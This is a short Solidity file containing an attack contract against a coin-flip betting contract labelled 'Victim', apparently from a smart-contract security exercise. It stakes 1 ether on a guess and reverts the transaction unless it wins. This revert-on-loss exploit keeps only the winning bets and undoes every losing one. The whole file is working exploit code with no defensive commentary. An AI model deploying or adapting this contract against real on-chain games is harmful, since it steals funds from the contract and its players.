//SPDX-License-Identifier: Unlicense
pragma solidity >=0.7.0 <0.9.0;
import "./Coinflip.sol";

contract Attack {
    address constant CoinflipAdress = 0xb26F1E90B46E7aCdDB00D59c08d33CCA1d985357;
    Victim public coinflipCTR;
    constructor() {
        coinflipCTR = Victim(CoinflipAdress);
    }
    
    function atac(uint256 betGuess) public payable {
        coinflipCTR.draw{value: 1 ether }(betGuess);
        require(coinflipCTR.winners(address(this)) == true,"Draw nereusit");            
    }
}